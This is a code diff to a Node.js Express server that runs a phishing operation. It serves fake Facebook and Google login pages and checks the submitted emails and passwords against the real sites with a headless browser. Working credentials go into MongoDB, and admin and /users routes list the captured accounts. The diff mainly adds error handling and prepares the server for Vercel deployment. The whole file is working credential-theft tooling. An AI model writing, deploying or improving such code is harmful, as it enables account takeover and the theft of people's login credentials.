@@ -18,20 +18,20 @@ const uri = process.env.MONGODB_URI;
 
 const app = express();
 dns.setServers(["1.1.1.1", "8.8.8.8"]);
-const PORT = process.env.PORT;
+const PORT = process.env.PORT || 3000;
+
 const connect = async () => {
   if (mongoose.connection.readyState >= 1) return;
   await mongoose.connect(uri);
   console.log("Connected to MongoDB");
 };
 
-
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json());
 
 app.get("/users", async (req, res) => {
   try {
-    await connect(); // تأمين الاتصال قبل الاستعلام
+    await connect();
     const users = await getAllThings();
     res.json(users);
   } catch (error) {
@@ -39,64 +39,84 @@ app.get("/users", async (req, res) => {
     res.status(500).json({ error: error.message });
   }
 });
+
 app.get("/", async (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
+
 app.get("/admin", (req, res) => {
   res.sendFile(path.join(__dirname, "admin.html"));
 });
+
 let facebook = 0;
 let google = 0;
+
 app.get('/facebook', (req, res) => {
   res.sendFile(path.join(__dirname, 'facebook.html'));
 });
 
 app.post('/login', async (req, res) => {
-  const { email, password } = req.body;
-  const result = await FacebookCheck(email, password);
-  console.log(`\nResult: ${result}`);
+  try {
+    await connect();
+    const { email, password } = req.body;
+    const result = await FacebookCheck(email, password);
+    console.log(`\nResult: ${result}`);
 
-  if (result) {
-    console.log("yes");
-    await facebookPostData(email, password);
-    console.log("\nPosted");
+    if (result) {
+      console.log("yes");
+      await facebookPostData(email, password);
+      console.log("\nPosted");
+    }
+    facebook++;
+    console.log(facebook);
+    res.json({ success: result });
+  } catch (error) {
+    console.error("Login error:", error);
+    res.status(500).json({ success: false, error: error.message });
   }
-  res.json({ success: result });
-
-
-
-  facebook++;
-  console.log(facebook);
-
 });
+
 app.get("/google", async (req, res) => {
   res.sendFile(path.join(__dirname, 'google.html'));
 });
+
 app.post("/google/login", async (req, res) => {
-  const { email, password } = req.body;
-  const result = await GoogleCheck(email, password);
-  console.log(`\nGoogle_Result: ${result}`);
+  try {
+    await connect();
+    const { email, password } = req.body;
+    const result = await GoogleCheck(email, password);
+    console.log(`\nGoogle_Result: ${result}`);
 
-  if (result && google < 2) {
-    await GooglePost(email, password);
-    console.log("\nGoogle_Posted");
+    if (result && google < 2) {
+      await GooglePost(email, password);
+      console.log("\nGoogle_Posted");
+    }
+    
+    if (google < 2) {
+      res.json({ success: result });
+    } else {
+      res.json({ success: false });
+    }
+    google++;
+    console.log(`Google number: ${google}`);
+  } catch (error) {
+    console.error("Google Login error:", error);
+    res.status(500).json({ success: false, error: error.message });
   }
-  if (google < 2) {
-    res.json({ success: result });
-
-
-  }
-  else {
-    res.json({ sucess: false });
-  }
-  google++;
-  console.log(`Google number: ${google}`);
 });
+
 app.delete("/delete", async (req, res) => {
-  const result = (req.body.type == "Google") ? await GoogleDelete(req.body.id) : await FacebookDelete(req.body.id);
-  console.log(result);
-  res.json({ success: result });
+  try {
+    await connect();
+    const result = (req.body.type == "Google") ? await GoogleDelete(req.body.id) : await FacebookDelete(req.body.id);
+    console.log(result);
+    res.json({ success: result });
+  } catch (error) {
+    console.error("Delete error:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
 });
+
 async function contains(elements, target, target2 = "", target3 = "") {
   for (const element of elements) {
     try {
@@ -147,9 +167,7 @@ async function FacebookCheck(email, pass) {
   }
 }
 
-
 async function facebookPostData(email, password, username = "") {
-
   const user = new FacebookUser({
     email: email,
     password: password,
@@ -162,19 +180,16 @@ async function facebookPostData(email, password, username = "") {
   });
 }
 
-app.listen(PORT, async () => {
-  
-  console.log(`\nServer is happily running on http://localhost:${PORT}`);
-  connect();
-});
 app.get("/ip", async(req,res)=>{
   const request = await fetch("https://api.ipify.org?format=json");
   const data = await request.json();
   res.json({ip: data.ip});
 });
+
 async function getIP(){
   
 }
+
 async function GoogleCheck(email, password) {
   // استبدل launchPersistentContext بهذا الكود داخل FacebookCheck و GoogleCheck:
   const isVercel = process.env.VERCEL || process.env.AWS_EXECUTION_ENV;
@@ -202,7 +217,6 @@ async function GoogleCheck(email, password) {
 
     const exists = await contains(textElements, "Couldn't", "Enter an email or phone number", "Type the text you hear or see");
 
-
     console.log(exists);
     await browser.close();
     return !exists;
@@ -227,11 +241,13 @@ async function GooglePost(email, password, username = "") {
     console.log('\n', err);
   });
 }
+
 async function FacebookDelete(id) {
   const result = await FacebookUser.findByIdAndDelete(id);
   console.log("Facebook");
   return result;
 }
+
 async function GoogleDelete(id) {
   const result = await GoogleUser.findByIdAndDelete(id);
   console.log("google");
@@ -248,3 +264,12 @@ async function getAllThings() {
   };
   return users;
 }
+
+if (!process.env.VERCEL) {
+  app.listen(PORT, async () => {
+    console.log(`\nServer is happily running on http://localhost:${PORT}`);
+    connect();
+  });
+}
+
+module.exports = app;
